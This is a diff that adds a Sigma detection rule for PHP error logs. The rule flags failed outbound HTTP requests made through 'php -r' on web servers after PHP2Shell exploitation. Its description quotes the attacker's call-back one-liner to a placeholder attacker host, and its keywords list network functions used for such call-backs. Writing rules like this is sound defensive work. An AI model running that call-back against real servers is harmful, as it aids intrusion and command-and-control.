@@ -1,0 +1,31 @@
+title: PHP Outbound HTTP Request From Command Line Code
+id: 20e71057-886e-41c2-8b26-1a4ca25d8afe
+status: experimental
+description: |
+    Detects a PHP warning about a failed HTTP request made from "Command line code", that is from code passed
+    to the PHP interpreter with "php -r". A web server has little reason to run "php -r" at all, and even less
+    to fetch a URL with it. After PHP2Shell (CVE-2026-109618) exploitation the spawned shell ran
+    php -r 'file_get_contents("http://<attacker>:8080/pwn-<target>");' as a call-back, which left this warning
+    when the attacker's listener did not answer.
+references:
+    - https://github.com/0x4D31/honeypot-data/blob/main/reports/php2shell/2026-10-24-confirmed-rce.md
+author: Zach Mathis (@yamatosecurity)
+date: 2026-10-26
+tags:
+    - attack.execution
+    - attack.t1059
+    - attack.command-and-control
+    - attack.t1105
+logsource:
+    product: php
+    service: error_log
+detection:
+    keywords:
+        - 'file_get_contents(http*in Command line code on line'
+        - 'fopen(http*in Command line code on line'
+        - 'curl_exec(*in Command line code on line'
+        - 'fsockopen(*in Command line code on line'
+    condition: keywords
+falsepositives:
+    - Administrators testing connectivity with php -r on the web server
+level: medium
